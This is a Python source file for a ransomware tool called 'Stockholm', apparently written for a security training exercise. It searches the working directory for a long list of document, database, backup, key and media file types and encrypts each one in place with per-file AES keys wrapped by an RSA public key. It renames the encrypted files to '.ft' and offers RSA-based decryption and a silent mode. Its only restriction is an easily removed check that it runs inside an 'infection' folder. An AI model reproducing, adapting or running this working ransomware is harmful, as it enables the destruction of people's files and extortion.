import argparse
import traceback
import sys
import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

BLUE = "\033[94m"
RED = "\033[91m"
GREEN = "\033[92m"
END = "\033[0m"

def print_info(state, msg):
    if not SILENT_MODE:
        print(BLUE + state + msg + END)

def target_files():
    ext_list = [".doc", ".docx", ".docb", ".docm", ".dot", ".dotm", ".dotx", ".xls", ".xlsx", ".xlsm", ".xlsb", ".xlw", ".xlt", ".xlm", ".xlc", ".xltx", ".xltm", ".ppt", ".pptx", ".pptm", ".pot", ".pps", ".ppsm", ".ppsx", ".ppam", ".potx", ".potm", ".pst", ".ost", ".msg", ".eml", ".edb", ".vsd", ".vsdx", ".txt", ".csv", ".rtf", ".123", ".wks", ".wk1", ".pdf", ".dwg", ".onetoc2", ".snt", ".hwp", ".602", ".sxi", ".sti", ".sldx", ".sldm", ".sldm", ".vdi", ".vmdk", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".bz2", ".tbk", ".bak", ".tar", ".tgz", ".gz", ".7z", ".rar", ".zip", ".backup", ".iso", ".vcd", ".jpeg", ".jpg", ".bmp", ".png", ".gif", ".raw", ".cgm", ".tif", ".tiff", ".nef", ".psd", ".ai", ".svg", ".djvu", ".m4u", ".m3u", ".mid", ".wma", ".flv", ".3g2", ".mkv", ".3gp", ".mp4", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".mp3", ".sh", ".class", ".jar", ".java", ".rb", ".asp", ".php", ".jsp", ".brd", ".sch", ".dch", ".dip", ".pl", ".vb", ".vbs", ".ps1", ".bat", ".cmd", ".js", ".asm", ".h", ".pas", ".cpp", ".c", ".cs", ".suo", ".sln", ".ldf", ".mdf", ".ibd", ".myi", ".myd", ".frm", ".odb", ".dbf", ".db", ".mdb", ".accdb", ".sql", ".sqlitedb", ".sqlite3", ".asc", ".lay6", ".lay", ".mml", ".sxm", ".otg", ".odg", ".uop", ".std", ".sxd", ".otp", ".odp", ".wb2", ".slk", ".dif", ".stc", ".sxc", ".ots", ".ods", ".3dm", ".max", ".3ds", ".uot", ".stw", ".sxw", ".ott", ".odt", ".pem", ".p12", ".csr", ".crt", ".key", ".pfx", ".der", ".ft"]
    final_list = []
    for dirpath, dirname, filename in os.walk(os.getcwd()):
        for file in filename:
            if file.endswith(tuple(ext_list)):
                final_list.append(os.path.join(dirpath, file))
    return final_list

def encrypt(files):
    rsa_public_key = RSA.import_key(open("stockholm.pub").read())
    cipher_rsa = PKCS1_OAEP.new(rsa_public_key)

    for file_path in files:
        if file_path.endswith(".ft"):
            continue
        new_path = file_path + ".ft"
        # Pour chaque fichier, on cr√©e une cl√© AES unique et al√©atoire
        aes_key = os.urandom(32)
        cipher_aes = AES.new(aes_key, AES.MODE_EAX)

        # On lit le contenu du fichier et on le chiffre avec AES
        with open(file_path, "rb") as f:
            data = f.read()
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)

        # On chiffre la cl√© AES avec RSA 
        encrypted_key = cipher_rsa.encrypt(aes_key)

        # On √©crit dans le fichier dans cet ordre:
        # 1. La cl√© AES chiffr√©e par RSA
        # 2. Le nonce (nombre utilis√© une seule fois pour la s√©curit√©)
        # 3. Le tag (signature qui v√©rifie l'int√©grit√©)
        # 4. Le contenu chiffr√© du fichier
        with open(file_path, "wb") as f:
            [f.write(x) for x in (encrypted_key, cipher_aes.nonce, tag, ciphertext)]
        print_info("‚úÖ ", f"Successfully encrypted: {file_path}")
        os.rename(file_path, new_path)
    return 0

def decrypt(reverse):
    rsa_private_key = RSA.import_key(open(reverse).read())
    cipher_rsa = PKCS1_OAEP.new(rsa_private_key)
    files = [f for f in target_files() if f.endswith('.ft')]
    
    for file_path in files:
        original_path = file_path[:-3]
        # On lit les diff√©rentes parties du fichier chiffr√©
        with open(file_path, "rb") as f:
            encrypted_key = f.read(rsa_private_key.size_in_bytes())  # Cl√© AES chiffr√©e
            nonce = f.read(16)  # Nombre unique
            tag = f.read(16)    # Signature
            ciphertext = f.read()  # Contenu chiffr√©
        
        # On d√©chiffre la cl√© AES avec la cl√© priv√©e RSA
        aes_key = cipher_rsa.decrypt(encrypted_key)
        
        # On utilise la cl√© AES pour d√©chiffrer le contenu
        cipher_aes = AES.new(aes_key, AES.MODE_EAX, nonce)
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)
        
        # On √©crit le contenu d√©chiffr√© dans le fichier
        with open(file_path, "wb") as f:
            f.write(data)
        print_info("‚úÖ ", f"Successfully decrypted: {file_path}")
        os.rename(file_path, original_path)
    return 0


def stockholm(reverse):
    if reverse:
        print_info("üîì ", "Reversing the encryption process with the given key: " + reverse)
        decrypt(reverse)
    else:
        print_info("üîê ", "Encrypting files")
        encrypt(target_files())

def main():
    global SILENT_MODE
    SILENT_MODE = False
    parser = argparse.ArgumentParser(prog="Stockholm - Malware ü¶†", description="Ransomware malware with encryption and decryption capabilities üîí", epilog="Developed by: https://github.com/fZpHr/ üë®‚Äçüíª")
    parser.add_argument("--version", "-v", required=False, action="store_true", help="Show version of the malware üìù")
    parser.add_argument("--reverse", "-r", required=False, type=str, metavar="üîë", help="Reverse the encryption process with the given üîë")
    parser.add_argument("--silent", "-s", required=False, action="store_true", help="Silent mode for the malware ü§´")
    args = parser.parse_args(sys.argv[1:])

    if args.version:
        print("Stockholm - Malware v1.0 ü¶†")
        return 0

    if args.silent:
        SILENT_MODE = True
    infection_dir = os.path.join(os.getenv("HOME"), "infection")
    if not os.path.dirname(os.path.abspath(__file__)).startswith(infection_dir):
        print_info("üìÇ ", f"This tool only works in a folder called 'infection' in the user's HOME directory (current: {__file__})")
        return 1
    stockholm(args.reverse)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(RED + "Error: " + str(e) + END)
        # traceback.print_exc()